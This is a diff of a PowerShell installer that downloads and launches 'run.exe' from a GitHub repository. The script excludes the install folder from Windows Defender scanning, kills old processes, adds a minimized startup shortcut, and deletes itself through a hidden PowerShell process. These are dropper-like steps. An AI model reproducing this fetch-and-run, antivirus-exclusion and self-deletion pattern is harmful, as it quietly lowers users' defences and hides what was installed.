@@ -19,27 +19,37 @@ if (-not $isUpdate) {
     Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
 }
 
-# kill all instances
-Get-Process -Name "run" -ErrorAction SilentlyContinue | Stop-Process -Force
-Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "" -and $_.Id -ne $PID } | Stop-Process -Force
-Start-Sleep -Seconds 2
+# cleanup old processes
+$oldProcs = Get-Process -Name "run" -ErrorAction SilentlyContinue
+if ($oldProcs) {
+    $oldProcs | Stop-Process -Force -ErrorAction SilentlyContinue
+    
+    while (Get-Process -Name "run" -ErrorAction SilentlyContinue) {
+        Start-Sleep -Seconds 1
+    }
+}
 
 # cleanup
-if (Test-Path $datFile) { Remove-Item $datFile -Force }
-if (Test-Path $runExe) { Remove-Item $runExe -Force }
-
+if (Test-Path $runExe) { Remove-Item $runExe -Force -Recurse -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $installDir -Force | Out-Null
 
-Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/releases/latest/download/run.exe" -OutFile $runExe -UseBasicParsing
+# fetch latest run.exe
+try {
+    $apiResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/yuan-miranda/run/commits/main" -UseBasicParsing
+    $latestCommit = $apiResponse.sha
+}
+catch {
+    $latestCommit = "main"
+}
+Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$latestCommit/run.exe" -OutFile $runExe -UseBasicParsing
 if (-not (Test-Path $runExe)) {
     exit
 }
 
-# startup
+# startup shortcut
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($shortcutPath)
 $Shortcut.TargetPath = $runExe
-$Shortcut.Arguments = "--startup"
 $Shortcut.WindowStyle = 7
 $Shortcut.Save()
 
@@ -58,7 +68,7 @@ try {
 }
 catch {}
 
-Start-Process $runExe -ArgumentList "--startup"
+Start-Process $runExe
 
 # self delete
 Start-Process powershell -ArgumentList "-Command `"Start-Sleep 5; Remove-Item '$scriptPath' -Force`"" -WindowStyle Hidden
